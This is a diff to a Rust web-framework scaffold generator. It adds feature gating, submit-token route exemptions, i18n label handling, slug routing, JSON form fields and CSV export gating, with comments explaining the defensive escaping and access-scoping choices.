+        let base = plan
+            .actions
+            .iter()
+            .rev()
+            .find_map(|a| match a {
+                Action::Modify { path, contents } if path == &cargo_path => Some(contents.clone()),
+                _ => None,
+            })
+            .unwrap_or_else(|| read_or_empty(&cargo_path));
+        let updated = ensure_autumn_web_feature(&base, "csv");
+        if updated != base {
+            plan.actions.retain(|a| a.path() != cargo_path);
+            plan.modify(cargo_path.clone(), updated);
+        }
+        // Pushed unconditionally — see the `maud` block above for why.
+        //
+        // `owner_dir: None` (unlike `maud`'s `src/routes`) because "some routes
+        // file still exists" is the wrong question for `csv`: only an
+        // EXPORT-ENABLED resource needs the feature, so a surviving `--live` or
+        // `--sharded` routes module would pin it forever. The
+        // `autumn_web::data::csv::` marker registered in
+        // `emit::autumn_web_feature_markers` is the precise test — it matches
+        // another scaffold's emitted `CsvSchema` impl *and* any hand-written
+        // `import_csv`/`export_csv` code, and matches neither when the resource
+        // being destroyed was the only user.
+        plan.push_revert(Revert::CargoAutumnWebFeature {
+            path: cargo_path,
+            feature: "csv".to_owned(),
+            owner_dir: None,
+        });
+    }
+
     // Issue #1319: a searchable (non-live) index inlines an htmx `<script>` and
     // its results handler extracts `HxRequest`, both gated behind autumn-web's
     // `htmx` feature — enable it. (Live variants enable `htmx` in the block
@@ -986,6 +2360,73 @@ fn plan_scaffold_with_options_impl(
                 owner_dir: Some(models_dir.clone()),
             });
         }
+
+        // The Cargo features make the scaffold COMPILE; a configured backend is
+        // what makes an upload actually persist. `StorageConfig::backend`
+        // defaults to `Disabled`, so without a `[storage]` block the generated
+        // `create` handler answers 500 "storage not configured" on the very
+        // first submit. We don't write the block ourselves — `autumn.toml` is
+        // the operator's file and the right backend is a deployment decision —
+        // but an author must not have to discover this by hitting the 500.
+        let autumn_toml = project_root.join("autumn.toml");
+        let toml_contents = plan
+            .actions
+            .iter()
+            .rev()
+            .find_map(|a| match a {
+                Action::Modify { path, contents } if path == &autumn_toml => Some(contents.clone()),
+                _ => None,
+            })
+            .unwrap_or_else(|| read_or_empty(&autumn_toml));
+        if !toml_contents.contains("[storage]") {
+            plan.warnings.push(
+                "attachment columns need a storage backend: `autumn.toml` has no `[storage]` \
+                 section, so uploads will fail with 500 \"storage not configured\". Add:\n\
+                 \n    [storage]\n    backend = \"local\"\n\n    [storage.local]\n    \
+                 root = \"target/blobs\"\n    mount_path = \"/_blobs\"\n\n\
+                 for development (see docs/guide/storage.md for S3 in production)."
+                    .to_owned(),
+            );
+        }
+    }
+
+    // Issue #1255: a scaffold with `richtext` columns needs autumn-web's
+    // `markdown` feature. The generated show view, preview route, and form
+    // control all call into `autumn_web::markdown::render_user_content` (via
+    // `form::rich_text_area_htmx`'s pre-rendered preview pane), which is gated
+    // on that feature — without it the scaffold would not compile.
+    // `--api` renders no form and no show view, so it needs neither the
+    // feature nor the preview route — the column is just TEXT carrying Markdown
+    // source out over JSON, and the client renders it.
+    // The show view renders EVERY richtext column (including a `--default`ed
+    // one, which the form drops but the detail page still displays), so the
+    // feature gate reads `fields`. The preview *routes* below are emitted only
+    // for form columns, so their exemption reads `rich_text_field_names`.
+    let rich_text_views = has_rich_text_fields(&fields) && !options_with_key.api;
+    if rich_text_views {
+        let cargo_path = project_root.join("Cargo.toml");
+        let base = plan
+            .actions
+            .iter()
+            .rev()
+            .find_map(|a| match a {
+                Action::Modify { path, contents } if path == &cargo_path => Some(contents.clone()),
+                _ => None,
+            })
+            .unwrap_or_else(|| read_or_empty(&cargo_path));
+        let updated = ensure_autumn_web_feature(&base, "markdown");
+        if updated != base {
+            plan.actions.retain(|a| a.path() != cargo_path);
+            plan.modify(cargo_path.clone(), updated);
+        }
+        // Pushed unconditionally for the same reason as the attachment block
+        // above: at `destroy` time the plan is recomputed against the already-
+        // generated Cargo.toml, where the feature is by definition present.
+        plan.push_revert(Revert::CargoAutumnWebFeature {
+            path: cargo_path,
+            feature: "markdown".to_owned(),
+            owner_dir: Some(project_root.join("src").join("routes")),
+        });
     }
 
     // --live requires `ws` (sse::stream), `maud` (LiveFragment/Markup), and `htmx`.
@@ -1083,35 +2524,65 @@ fn plan_scaffold_with_options_impl(
         }
     }
 
-    // ── autumn.toml: exempt the live-validation routes from the submit-token
-    // guard (issue #1360). The generated `POST /{plural}/validate/{field}`
-    // inline-validation routes `hx-include` the whole form, so without this the
-    // one-time `_submit_token` is consumed by a validation POST and the real
-    // create/update submit replays a validation fragment instead of mutating.
+    // ── autumn.toml: exempt this resource's form-echoing POST routes from the
+    // submit-token guard.
+    //
+    // Both families `hx-include` the whole form, so without an exemption the
+    // one-time `_submit_token` is consumed by a helper request and the real
+    // create/update submit replays a fragment instead of mutating:
+    //
+    // - `POST /{plural}/validate/{field}` — `--live-validation` inline
+    //   validation (issue #1360).
+    // - `POST /{plural}/preview/{field}` — a `richtext` column's live Markdown
+    //   preview (issue #1255).
+    //
     // The `hx-params="not _submit_token"` markup filter mitigates this only for
     // the DEFAULT field name; exempting the route by prefix makes it robust for
-    // ANY configured `security.submit_token.field_name`. Only meaningful for
-    // `--live-validation`, and only when the project actually has an
-    // `autumn.toml` to edit (a bare/hand-rolled project keeps the markup
-    // filter as its sole, still-effective default-field-name guard).
+    // ANY configured `security.submit_token.field_name`. Only applied when the
+    // project actually has an `autumn.toml` to edit (a bare/hand-rolled project
+    // keeps the markup filter as its sole, still-effective default-field-name
+    // guard).
+    let mut exempt_segments: Vec<&str> = Vec::new();
     if options_with_key.live_validation {
+        exempt_segments.push("validate");
+    }
+    if !rich_text_field_names.is_empty() {
+        exempt_segments.push("preview");
+    }
+    if !exempt_segments.is_empty() {
         let autumn_toml_path = project_root.join("autumn.toml");
         if autumn_toml_path.exists() {
-            let toml_existing = read_or_empty(&autumn_toml_path);
-            // Only record the modify *and* the destroy-time revert when this
-            // scaffold actually inserts the exemption. If `/{plural}/validate`
-            // is already present (a preexisting, user-owned entry), the append
-            // is a no-op and returns `None`; recording a revert then would let a
-            // later `autumn destroy` delete an exemption we never added,
-            // re-enabling submit-token guarding on live-validation routes.
-            if let Some(updated_toml) =
-                append_submit_token_validate_exempt_to_toml(&toml_existing, &plural)
-            {
-                plan.modify(autumn_toml_path.clone(), updated_toml);
-                plan.push_revert(Revert::SubmitTokenValidateExempt {
-                    path: autumn_toml_path,
-                    plural,
-                });
+            for segment in exempt_segments {
+                // Re-read the *planned* content each round so a second segment
+                // merges into the first's edit instead of overwriting it.
+                let toml_existing = plan
+                    .actions
+                    .iter()
+                    .rev()
+                    .find_map(|a| match a {
+                        Action::Modify { path, contents } if path == &autumn_toml_path => {
+                            Some(contents.clone())
+                        }
+                        _ => None,
+                    })
+                    .unwrap_or_else(|| read_or_empty(&autumn_toml_path));
+                // Only record the modify *and* the destroy-time revert when this
+                // scaffold actually inserts the exemption. If the prefix is
+                // already present (a preexisting, user-owned entry), the append
+                // is a no-op and returns `None`; recording a revert then would
+                // let a later `autumn destroy` delete an exemption we never
+                // added, re-enabling submit-token guarding on those routes.
+                if let Some(updated_toml) =
+                    append_submit_token_exempt_to_toml(&toml_existing, &plural, segment)
+                {
+                    plan.actions.retain(|a| a.path() != autumn_toml_path);
+                    plan.modify(autumn_toml_path.clone(), updated_toml);
+                    plan.push_revert(Revert::SubmitTokenValidateExempt {
+                        path: autumn_toml_path.clone(),
+                        plural: plural.clone(),
+                        segment: segment.to_owned(),
+                    });
+                }
             }
         }
     }
@@ -1190,9 +2661,14 @@ fn validate_enum_field_names_against_routes_imports(
     Ok(())
 }
 
+/// `for_revert` skips the generation-only refusals: `autumn destroy scaffold`
+/// recomputes the plan it is about to revert, and refusing there would strand
+/// the very files the user asked to delete (same posture as the `slug`/
+/// `lock_version` gates in `plan_scaffold_with_options_impl`).
 fn parse_query_specs(
     fields: &[Field],
     queries: &[String],
+    for_revert: bool,
 ) -> Result<Vec<QuerySpec>, GenerateError> {
     let mut parsed = Vec::with_capacity(queries.len());
     for query in queries {
@@ -1236,6 +2712,21 @@ fn parse_query_specs(
             return Err(GenerateError::InvalidField {
                 token: query.clone(),
                 reason: format!("`--query` on enum field '{field_name}' is not yet supported"),
+            });
+        }
+        // Issue #1340 AC6: a derived `find_by_<col>` against a RANDOMIZED
+        // encrypted column compiles fine and then fails at runtime — the
+        // repository macro routes the bound string through the encrypted-column
+        // registry, which raises `EncryptionError::RandomizedEqualityLookup`
+        // because a fresh nonce per write means the needle's ciphertext can
+        // never equal the stored one. Refuse it where the fix is one word away.
+        if !for_revert && field.is_randomized_encrypted() {
+            return Err(GenerateError::InvalidField {
+                token: query.clone(),
+                reason: randomized_equality_lookup_reason(
+                    field_name,
+                    "has a `--query` derived equality lookup",
+                ),
             });
         }
         if parsed.iter().any(|spec: &QuerySpec| spec.method == method) {
@@ -1349,6 +2840,7 @@ fn render_repository_file(
     live: bool,
     searchable: bool,
     owner_column: Option<&str>,
+    position: Option<&Field>,
 ) -> String {
     let plural = pluralize(snake_name);
     let query_body = render_repository_queries(pascal_name, queries);
@@ -1377,6 +2869,17 @@ fn render_repository_file(
     // (no owner column, `--no-policy`, `--live`, `--sharded`) passes `None` and
     // the attr — and the scoped methods — are omitted.
     let owner_attr = owner_column.map_or(String::new(), |col| format!(", owner = {col}"));
+    // Issue #1358: a `position`/`position{{scope:col}}` DSL field wires
+    // `position(column = "...", scope = "...")` into the generated
+    // `#[repository(...)]` attribute, which is what actually generates the
+    // `move_to`/`move_before`/`move_after`/`move_up`/`move_down` methods —
+    // the DSL field alone only shapes the model struct and migration.
+    let position_attr = position.map_or(String::new(), |f| {
+        f.constraints.scope.as_deref().map_or_else(
+            || format!(", position(column = \"{}\")", f.name),
+            |scope| format!(", position(column = \"{}\", scope = \"{scope}\")", f.name),
+        )
+    });
     let sharded_note = if sharded {
         format!(
             "//!\n\
@@ -1483,7 +2986,7 @@ fn render_repository_file(
          use crate::models::{snake_name}::{{{pascal_name}, New{pascal_name}, Update{pascal_name}{draft_ext_import}}};\n\
          use crate::schema::{plural};\n\
          \n\
-         #[autumn_web::repository({pascal_name}, api = \"/api/{plural}\"{soft_delete_attr}{broadcasts_attr}{searchable_attr}{owner_attr})]\n\
+         #[autumn_web::repository({pascal_name}, api = \"/api/{plural}\"{soft_delete_attr}{broadcasts_attr}{searchable_attr}{owner_attr}{position_attr})]\n\
          pub trait {pascal_name}Repository {{\n\
 {query_body}\
          }}\n\
@@ -1564,6 +3067,8 @@ fn render_model_form(
     pascal_name: &str,
     fields: &[Field],
     validations: &BTreeMap<String, Vec<String>>,
+    // The parent foreign-key column under `--belongs-to` (issue #1323).
+    parent_fk: Option<&str>,
 ) -> ModelFormParts {
     use std::fmt::Write;
     let mut struct_fields = String::new();
@@ -1589,6 +3094,15 @@ fn render_model_form(
             for rule in rules {
                 let _ = writeln!(struct_fields, "    #[validate({rule})]");
             }
+        }
+        // Issue #1323: under `--belongs-to` the nested inline create form
+        // renders no control for the parent foreign key (the parent is the URL),
+        // so a nested submission carries no value for it. `#[serde(default)]`
+        // turns that absence into an empty string the nested handler
+        // immediately overwrites from the path, instead of a "missing field"
+        // 400. The flat form still submits a real value through its select.
+        if parent_fk == Some(name.as_str()) {
+            let _ = writeln!(struct_fields, "    #[serde(default)]");
         }
         if f.kind.is_attachment() {
             // Zero-JS multipart uploads (issue #1236): the attachment is NOT a
@@ -1712,6 +3226,40 @@ fn render_model_form(
                     "            {name}: match &row.{name} {{ {arms}}},"
                 );
             }
+        } else if f.kind == FieldKind::Json {
+            // Issue #1341 AC5: represented as a `String` on the form (the
+            // `<textarea>`'s wire shape — see `render_form_for_helper`'s
+            // `FieldControl::Textarea` override), so it always decodes;
+            // `into_new` parses it into `serde_json::Value`
+            // (`serde_json::Value: FromStr<Err = serde_json::Error>`), a bad
+            // value yielding a 400 naming the field — the same
+            // `bad_request_msg` pattern as the enum/datetime arms above, not
+            // a 500. A blank OPTIONAL textarea means "no value" (`None`), not
+            // invalid JSON — mirrors the nullable-`DateTime` blank-is-absent
+            // filter below; a blank REQUIRED field is correctly rejected as
+            // invalid JSON (empty input is not valid JSON syntax).
+            if f.nullable {
+                let _ = writeln!(struct_fields, "    pub {name}: Option<String>,");
+                let _ = writeln!(
+                    into_new,
+                    "        {name}: form.{name}.as_deref().filter(|value| !value.trim().is_empty())\n\
+                     \x20\x20\x20\x20\x20\x20\x20\x20.map(|value| value.parse::<serde_json::Value>())\n\
+                     \x20\x20\x20\x20\x20\x20\x20\x20.transpose()\n\
+                     \x20\x20\x20\x20\x20\x20\x20\x20.map_err(|err| autumn_web::AutumnError::bad_request_msg(format!(\"{name}: {{err}}\")))?,"
+                );
+                let _ = writeln!(
+                    from_row,
+                    "            {name}: row.{name}.as_ref().map(ToString::to_string),"
+                );
+            } else {
+                let _ = writeln!(struct_fields, "    pub {name}: String,");
+                let _ = writeln!(
+                    into_new,
+                    "        {name}: form.{name}.parse::<serde_json::Value>()\n\
+                     \x20\x20\x20\x20\x20\x20\x20\x20.map_err(|err| autumn_web::AutumnError::bad_request_msg(format!(\"{name}: {{err}}\")))?,"
+                );
+                let _ = writeln!(from_row, "            {name}: row.{name}.to_string(),");
+            }
         } else if is_constrained_required_numeric {
             // A required numeric with a `{min,max}` range (issue #1388) is
             // `Option<T>` on the form struct (issue #1748). `validator`'s
@@ -1828,6 +3376,17 @@ fn render_model_form(
     }
 }
 
+/// The extractor's LOCAL BINDING name for a slug-keyed route (issue #1260) —
+/// deliberately fixed and `__`-prefixed (matching this file's other
+/// internal-only identifiers, e.g. `__parse_result`), NOT the DSL field name.
+/// A field literally named `db`/`flash`/`body`/`csrf`/`session`/etc. is a
+/// valid declaration (`db:slug{from:title}`), and destructuring straight to
+/// that name would collide with the handler's own same-named extractor
+/// parameter — a real "duplicate binding" compile error a review caught. The
+/// actual field name is still used for the schema column and the URL
+/// placeholder segment — only the Rust-local binding is renamed.
+const ROUTE_KEY_BINDING: &str = "__route_key";
+
 #[allow(
     clippy::too_many_lines,
     reason = "This is a single template — splitting it produces less readable output, \
@@ -1851,8 +3410,305 @@ fn render_routes_file(
     authorize: bool,
     owner: Option<&str>,
     searchable: &[String],
+    // Issue #1323: `Some` only under `--belongs-to`, which adds the nested
+    // read/create routes and the shared `children_section` the parent's own
+    // `show` view renders. `None` keeps every emission below byte-identical to
+    // the pre-#1323 flat scaffold.
+    nesting: Option<&super::nested::Nesting>,
+    // Issue #1349: the seam every user-facing view string passes through.
+    // Disabled (`--i18n` off) it returns each caller's literal expression
+    // verbatim, so this whole template renders byte-for-byte as before.
+    labels: &scaffold_i18n::ViewLabels,
 ) -> String {
     let id_rust = id_type.rust_type();
+    // Issue #1349: with `--i18n`, every view-rendering handler takes the
+    // `Locale` extractor so the `t!` calls below have a `locale` in scope. It
+    // goes FIRST in every signature: `Locale` is a `FromRequestParts`
+    // extractor, and axum requires the single body-consuming (`FromRequest`)
+    // argument — `body: Bytes`, `Multipart` — to be last. Empty without the
+    // flag, keeping each signature byte-identical.
+    let locale_param = if labels.enabled() {
+        "locale: Locale,\n    "
+    } else {
+        ""
+    };
+    // Same, for the handlers whose parameter lists are written inline on one
+    // line rather than one-per-line.
+    let locale_param_inline = if labels.enabled() {
+        "locale: Locale, "
+    } else {
+        ""
+    };
+    // (Kept as empty strings so the handler/form templates below can splice a
+    // per-handler label prelude without a second set of conditionals.)
+    // Issue #1349: no `l_resource` binding any more — see `new_link_text`.
+    let resource_bind = String::new();
+    let resource_bind_form = String::new();
+    // The three page-furniture strings every HTML index variant renders, and the
+    // create/edit chrome shared by the form views. Computed once so the six
+    // index templates and both search templates below stay literal-free without
+    // repeating the key/English pair eight times.
+    let index_title = labels.lit_ref(
+        &format!("{snake_name}.index.title"),
+        &format!("{pascal_name} index"),
+    );
+    let index_heading = labels.markup(
+        &format!("{snake_name}.name.plural"),
+        &format!("{pascal_name}s"),
+    );
+    // "New {Model}" is a per-resource key, NOT chrome with the noun passed in as
+    // a Fluent argument. Interpolating a noun into a sentence pattern is the
+    // classic i18n trap: French needs *Nouveau*/*Nouvelle* by gender, German
+    // *Neuer*/*Neue*/*Neues*, and Slavic languages inflect the noun itself — a
+    // translator handed `New { $resource }` cannot get any of that right from
+    // the bundle alone. One key per resource costs one extra line in `en.ftl`
+    // and is translatable. (The same reasoning the sibling `{snake}.delete.confirm`
+    // and `{snake}.trash.heading` keys already follow. `{ $id }` is fine to
+    // interpolate — a number carries no grammatical gender.)
+    let new_link_text = labels.lit(&format!("{snake_name}.new"), &format!("New {pascal_name}"));
+    let new_link_markup =
+        labels.markup(&format!("{snake_name}.new"), &format!("New {pascal_name}"));
+    let back_to_list = labels.lit("common.back", "Back to list");
+    let back_to_list_markup = labels.markup("common.back", "Back to list");
+    let edit_link_text = labels.lit("common.edit", "Edit");
+    // Create/edit form chrome. The `New {Pascal}` title is the SAME
+    // per-resource `{snake}.new` key the index link uses, for the reason given
+    // above: interpolating the model name into a shared pattern hands the
+    // translator a sentence whose article and adjective must agree with a noun
+    // they cannot see.
+    let new_title = labels.lit_ref(&format!("{snake_name}.new"), &format!("New {pascal_name}"));
+    let new_heading = labels.markup(&format!("{snake_name}.new"), &format!("New {pascal_name}"));
+    let create_button = labels.lit("common.create", "Create");
+    let create_button_ref = labels.lit_ref("common.create", "Create");
+    let save_button = labels.lit("common.save", "Save");
+    let save_button_ref = labels.lit_ref("common.save", "Save");
+    let delete_button = labels.markup("common.delete", "Delete");
+    // The shared `{snake}_form_for` helper renders every labeled control, so it
+    // needs the locale too. By reference — it only forwards it into `t!`-built
+    // `override_label` values, so there is nothing to own.
+    let form_for_locale_arg = if labels.enabled() {
+        "locale.clone(), "
+    } else {
+        ""
+    };
+    // The generated routes module imports explicitly (no `prelude::*`), so the
+    // extractor and the macro both need naming. Both live behind autumn-web's
+    // `i18n` feature, which the plan enables on the project's Cargo.toml.
+    let i18n_imports = if labels.enabled() {
+        "use autumn_web::i18n::Locale;\nuse autumn_web::t;\n"
+    } else {
+        ""
+    };
+    // Empty-state copy. `DataTableConfig::new` takes `&str`, and the config is a
+    // temporary borrowed only for the `data_table(...)` call, so an inline
+    // `&t!(…)` is fine here — no binding needed.
+    let index_empty = labels.lit_ref(
+        &format!("{snake_name}.index.empty"),
+        &format!("No {plural} yet."),
+    );
+    // The strings only the flag-gated surfaces render. Registered lazily so a
+    // scaffold without the flag never defines a key nothing references — which
+    // is exactly what `autumn i18n check` reports as unused.
+    let (search_empty, search_box_placeholder) = if searchable.is_empty() {
+        (String::new(), String::new())
+    } else {
+        (
+            labels.lit_ref(
+                &format!("{snake_name}.search.empty"),
+                &format!("No {plural} found."),
+            ),
+            labels.lit_ref(
+                &format!("{snake_name}.search.placeholder"),
+                &format!("Search {pascal_name}s…"),
+            ),
+        )
+    };
+    // The destructive button keeps its `window.confirm` guard, so the prompt has
+    // to travel through a JavaScript string literal — and a translation is not
+    // trusted input: it can come from a translator, a TMS, or a crowdsourced
+    // `.ftl`. Maud escapes the attribute value for HTML, but nothing escapes it
+    // for JS, so the encoding has to be exact.
+    //
+    // `serde_json::to_string` is that encoder: JSON string syntax is a subset of
+    // JavaScript's, and it escapes the quote, the BACKSLASH, and every control
+    // character. Hand-rolling `.replace('\'', "\\'")` is not enough — it leaves
+    // backslashes alone, so `C:\temp` smuggles in a tab and a trailing `\` before
+    // an apostrophe escapes the generator's own escape and closes the string
+    // early, turning the rest of the translation into executable code. The
+    // emitted double quotes are HTML-escaped by Maud and un-escaped by the
+    // parser before JS ever sees them. (`serde_json` is already imported by the
+    // generated module.)
+    let delete_confirm_key = format!("{snake_name}.delete.confirm");
+    let delete_confirm_ftl = format!("Delete this {pascal_name}?");
+    let (delete_confirm_bind, delete_confirm_attr) = if labels.enabled() {
+        (
+            format!(
+                r#"@let delete_confirm_js = format!("return confirm({{}})", serde_json::to_string(&{}).unwrap_or_else(|_| "\"\"".into()));
+            "#,
+                labels.lit(&delete_confirm_key, &delete_confirm_ftl)
+            ),
+            "(delete_confirm_js)".to_owned(),
+        )
+    } else {
+        (
+            String::new(),
+            format!("\"return confirm('Delete this {pascal_name}?')\""),
+        )
+    };
+    // `--searchable` only. Registered lazily so a non-searchable scaffold never
+    // writes these keys into `en.ftl` (an unreferenced key is exactly what
+    // `autumn i18n check` reports as unused). `{snake}.search.title` serves the
+    // page `<h1>`, the `<title>`, and the search input's visible label — they
+    // are the same words naming the same thing, so one key keeps them in step.
+    let (search_title, search_heading, search_box_label) = if searchable.is_empty() {
+        (String::new(), String::new(), String::new())
+    } else {
+        (
+            labels.lit_ref(
+                &format!("{snake_name}.search.title"),
+                &format!("Search {pascal_name}s"),
+            ),
+            labels.markup(
+                &format!("{snake_name}.search.title"),
+                &format!("Search {pascal_name}s"),
+            ),
+            labels.lit_ref(
+                &format!("{snake_name}.search.title"),
+                &format!("Search {pascal_name}s"),
+            ),
+        )
+    };
+    // Issue #1260: a `slug` field reroutes `show`/`edit`/`update`/`delete` (and
+    // their generated links) to key off the slug instead of `id`. The
+    // `plan_scaffold_with_options_impl` gate above ensures a slug never
+    // coexists with `--live`/`--live-validation`/`--sharded`/an `Attachment`
+    // field/a `:states(...)` field, so every one of those branches below stays
+    // fully unreachable whenever `route_key_field` is `Some` — they need no
+    // changes. When `route_key_field` is `None` (the overwhelming common
+    // case: no slug field at all), every helper below reduces to exactly the
+    // pre-#1260 text, so a non-slug scaffold's output is byte-for-byte
+    // unchanged.
+    let slug_field: Option<&Field> = fields.iter().find(|f| f.kind.is_slug());
+    let route_key_field: Option<&str> = slug_field.map(|f| f.name.as_str());
+    // The `id`/`slug` parameter declaration for a `show`/`edit`/`update`/
+    // `delete` handler signature — substitutes in place of the pre-#1260
+    // literal `id: Path<{id_rust}>` text.
+    let id_param_decl: String = route_key_field.map_or_else(
+        || format!("id: Path<{id_rust}>"),
+        |_| format!("Path({ROUTE_KEY_BINDING}): Path<String>"),
+    );
+    // The URL path segment name for those same four routes.
+    let id_url_segment: &str = route_key_field.unwrap_or("id");
+    // The `{plural}::table` row lookup — substitutes in place of the
+    // pre-#1260 literal `.find(*id)` (dot kept in the surrounding template).
+    let find_expr: String = route_key_field.map_or_else(
+        || "find(*id)".to_owned(),
+        |f| format!("filter({plural}::{f}.eq(&{ROUTE_KEY_BINDING}))"),
+    );
+    // The value expression used everywhere a route handler builds a
+    // `paths::*`/error-message argument identifying the row it just loaded —
+    // substitutes in place of the pre-#1260 literal `*id`.
+    let id_value_expr: String =
+        route_key_field.map_or_else(|| "*id".to_owned(), |_| format!("&{ROUTE_KEY_BINDING}"));
+    // Same, but for a loaded `row: {pascal_name}` value rather than the path
+    // extractor local — substitutes in place of the pre-#1260 literal `row.id`
+    // wherever a view displays or links the record it just rendered. Borrows
+    // (`&row.{f}`) rather than reading `row.{f}` by value: unlike `row.id`
+    // (`i64`, `Copy`), a slug is a non-`Copy` `String` field, and every
+    // substitution site below already accepts `impl Display`/`Render` on a
+    // reference, so borrowing here avoids depending on happening to be the
+    // last use of `row` in the surrounding handler.
+    let route_key_display_expr: String =
+        route_key_field.map_or_else(|| "row.id".to_owned(), |f| format!("&row.{f}"));
+    // Issue #1349: the detail page's title and heading both render
+    // "{Model} #{key}". The Fluent value interpolates the key rather than
+    // concatenating around it, so a translation can place it wherever its
+    // language puts it.
+    let show_title_key = format!("{snake_name}.show.title");
+    let show_title_ftl = format!("{pascal_name} #{{ $id }}");
+    let show_id_arg = format!("&({route_key_display_expr}).to_string()");
+    let show_title = labels.expr_ref(
+        &show_title_key,
+        &show_title_ftl,
+        &format!("&format!(\"{pascal_name} #{{}}\", {route_key_display_expr})"),
+        &[("id", &show_id_arg)],
+    );
+    let show_heading = labels.markup_expr(
+        &show_title_key,
+        &show_title_ftl,
+        &format!("\"{pascal_name} #\" ({route_key_display_expr})"),
+        &[("id", &show_id_arg)],
+    );
+    // The `:states(...)` variant renders the same page from a shared `show_view`
+    // helper, which is always `id`-keyed (a slug column and a state-machine
+    // column are refused together upstream).
+    let show_view_title = labels.expr_ref(
+        &show_title_key,
+        &show_title_ftl,
+        &format!("&format!(\"{pascal_name} #{{}}\", row.id)"),
+        &[("id", "&row.id.to_string()")],
+    );
+    let show_view_heading = labels.markup_expr(
+        &show_title_key,
+        &show_title_ftl,
+        &format!("\"{pascal_name} #\" (row.id)"),
+        &[("id", "&row.id.to_string()")],
+    );
+    // The edit form's title/heading. Keyed per-resource because the English
+    // carries the model's own name; the row key is a Fluent argument so a
+    // translation can position it. Two shapes: the standard form keys off
+    // `{id_value_expr}` (a slug column reroutes it), the live-validation form
+    // always off `*id`.
+    let edit_title_key = format!("{snake_name}.edit.title");
+    let edit_title_ftl = format!("Edit {pascal_name} #{{ $id }}");
+    let edit_id_arg = format!("&({id_value_expr}).to_string()");
+    let edit_title = labels.expr_ref(
+        &edit_title_key,
+        &edit_title_ftl,
+        &format!("&format!(\"Edit {pascal_name} #{{}}\", {id_value_expr})"),
+        &[("id", &edit_id_arg)],
+    );
+    let edit_heading = labels.markup_expr(
+        &edit_title_key,
+        &edit_title_ftl,
+        &format!("\"Edit {pascal_name} #\" ({id_value_expr})"),
+        &[("id", &edit_id_arg)],
+    );
+    let edit_title_live = labels.expr_ref(
+        &edit_title_key,
+        &edit_title_ftl,
+        &format!("&format!(\"Edit {pascal_name} #{{}}\", *id)"),
+        &[("id", "&(*id).to_string()")],
+    );
+    let edit_heading_live = labels.markup_expr(
+        &edit_title_key,
+        &edit_title_ftl,
+        &format!("\"Edit {pascal_name} #\" (*id)"),
+        &[("id", "&(*id).to_string()")],
+    );
+    // `show_view` is a plain helper, not a handler, so it takes the locale as an
+    // ordinary argument — BY VALUE. `t!` expands to `Locale::t(&locale, …)`, and
+    // a `&Locale` binding would make that a `&&Locale` the signature rejects.
+    // `Locale` is a cheap clone: a tag string plus an `Arc` to the shared bundle.
+    let (show_view_locale_param, show_view_locale_arg, show_view_locale_arg_multiline) =
+        if labels.enabled() {
+            (
+                "locale: Locale,\n    ",
+                "locale.clone(), ",
+                "locale.clone(), ",
+            )
+        } else {
+            ("", "", "")
+        };
+    // The value the `update` handler's SUCCESS redirect resolves the row
+    // by — unlike `id_value_expr` (the path extractor's PRE-update value,
+    // still correct for the not-found message above it), this must read the
+    // just-persisted `new.{f}` for a slug: if the user edited (or blanked,
+    // triggering re-derivation of) the slug, redirecting to the OLD path
+    // value 404s (issue #1260 review finding). `id` never changes on
+    // update, so the non-slug case stays the pre-#1260 `*id`.
+    let update_redirect_expr: String =
+        route_key_field.map_or_else(|| "*id".to_owned(), |f| format!("&new.{f}"));
     // Issue #1319: the full-text search box + results handler apply only to the
     // standard (non-live) HTML index. The `--live`/`--live-validation` list is a
     // `<ul>` with an SSE out-of-band swap contract that a `data_table` search
@@ -1860,6 +3716,14 @@ fn render_routes_file(
     // model/repository/migration still get `searchable`). Precedent: the label
     // -map gating for the live index.
     let search_enabled = !searchable.is_empty() && !live && !live_validation;
+    // Issue #1312: bulk-select + `POST /{plural}/bulk_delete`. Emitted only for
+    // the standard HTML list. `--live`/`--live-validation` own their list DOM
+    // through an SSE/htmx out-of-band swap contract that a wrapping `<form>` and
+    // an extra checkbox column would break, and the `--sharded` repository has no
+    // cross-shard `delete_many` to route a mixed selection through — so those
+    // three variants stay byte-identical to their pre-#1312 output. (`--api`
+    // emits no HTML routes file at all, so it needs no gate here.)
+    let bulk_delete_enabled = !live && !live_validation && !sharded;
     let validated_fields: Vec<&str> = validations.keys().map(String::as_str).collect();
     let unique_fields: Vec<&Field> = fields.iter().filter(|f| f.unique).collect();
     // Issue #1326: fields carrying a `:states(…)` state machine. Only these
@@ -1871,6 +3735,16 @@ fn render_routes_file(
         .filter(|f| f.state_machine.is_some())
         .collect();
     let has_state_machine = !sm_fields.is_empty();
+    // Issue #1318: the optimistic-locking column, read from `all_fields` —
+    // `fields` is the FORM field list, and `lock_version` is deliberately absent
+    // from it (the version is carried in a hidden input, never as an editable
+    // control; see `plan_scaffold`'s `form_fields` filter). `None` for the
+    // overwhelming common case, which keeps every emission below byte-identical
+    // to the pre-#1318 output.
+    let lock_version: Option<&Field> = super::model::lock_version_field(all_fields);
+    // The Rust type of the version counter (`i32`/`i64`), used for the hidden
+    // field's parse target and the shared `form_for` helper's parameter.
+    let lock_version_ty: String = lock_version.map(Field::rust_type).unwrap_or_default();
     let update_columns = render_update_columns(plural, fields);
     let nullable_field_match = render_nullable_field_match(fields);
     let has_attachments = has_attachment_fields(fields);
@@ -1897,6 +3771,239 @@ fn render_routes_file(
     // current user. The `--sharded`/`--live`/`--live-validation` owner indexes
     // keep the #1830 manual owner-filtered query (no scoped repo methods emitted).
     let owner_scoped_standard = owner_scoped_index && !sharded && !live && !live_validation;
+    // Issue #1315: the `GET /{plural}/export.csv` download + the index's
+    // "Export CSV" link. Emitted exactly where the index's row set is a
+    // repository call the export can reuse VERBATIM — `repo.list_scoped` on the
+    // owner-scoped standard index, `repo.list` on the plain one. That is the
+    // whole security argument for AC5: the export never re-derives a row set of
+    // its own, so it cannot widen past what the index already shows.
+    //
+    // Gated OFF for: `--live` (an SSE `<ul>` on `repo.page`, no `ListQuery` to
+    // honour), `--sharded` (`from_shard` pins the query to one shard, so an
+    // "export everything" file would silently cover a fraction of the table),
+    // and the owner-scoped `--live-validation`/`--sharded` indexes, which run a
+    // MANUAL owner-filtered diesel query rather than a scoped repository method
+    // — re-deriving that filter by hand in a second handler is exactly the kind
+    // of duplication that leaks rows when one side is later edited. Plain
+    // (non-owner) `--live-validation` renders the standard data_table index on
+    // `repo.list`, so it DOES get the export. Must agree exactly with the
+    // matching gate in `plan_scaffold_with_options_impl` (plus `--api`, which
+    // emits no HTML routes module at all), or `main.rs` would mount a route this
+    // module never emitted.
+    let export_enabled = owner_scoped_standard || (!owner_scoped_index && !live && !sharded);
